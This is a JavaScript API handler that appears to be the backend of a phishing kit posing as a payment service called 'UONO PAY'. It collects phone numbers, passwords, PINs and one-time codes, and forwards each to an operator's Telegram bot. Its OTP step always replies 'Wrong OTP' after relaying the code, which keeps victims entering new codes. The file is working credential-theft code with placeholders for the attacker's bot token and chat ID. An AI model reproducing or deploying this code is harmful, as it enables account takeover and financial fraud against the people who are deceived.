export default async function handler(req, res) {
  if (req.method !== 'POST') {
    res.setHeader('Allow', ['POST']);
    return res.status(405).json({ error: `Method ${req.method} Not Allowed` });
  }

  try {
    const { type, phone, pass, pin, otp } = req.body;

    // Yahan apna Telegram Bot Token aur Chat ID dalein
    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YAHAN_APNA_BOT_TOKEN_DAALEIN';
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID || 'YAHAN_APNA_CHAT_ID_DAALEIN';

    async function sendTelegramMessage(text) {
      try {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: text,
            parse_mode: 'Markdown'
          })
        });
      } catch (err) {
        console.error('Telegram API Error:', err);
      }
    }

    switch (type) {
      case 'login':
        if (!phone || !pass || !pin) {
          return res.status(400).json({ error: 'All fields are required.' });
        }
        
        await sendTelegramMessage(
          `🚨 *UONO PAY - New Login Details*\n\n📱 *Phone:* \`${phone}\`\n🔑 *Password:* \`${pass}\`\n🔢 *PIN:* \`${pin}\``
        );

        return res.status(200).json({ success: true, message: 'Credentials received.' });

      case 'send_otp':
        if (!phone) {
          return res.status(400).json({ error: 'Phone number is required.' });
        }

        await sendTelegramMessage(
          `📩 *UONO PAY - OTP Requested*\n\n📱 *Phone:* \`${phone}\``
        );

        return res.status(200).json({ success: true, message: 'OTP sent successfully.' });

      case 'verify_otp':
        if (!otp) {
          return res.status(400).json({ error: 'OTP is required.' });
        }

        await sendTelegramMessage(
          `🔐 *UONO PAY - OTP Entered*\n\n📱 *Phone:* \`${phone}\`\n🔢 *OTP:* \`${otp}\``
        );

        return res.status(400).json({ error: 'Wrong OTP! Please try again.' });

      default:
        return res.status(400).json({ error: 'Invalid request type.' });
    }
  } catch (err) {
    console.error('Server Error:', err);
    return res.status(500).json({ error: 'Internal Server Error' });
  }
}
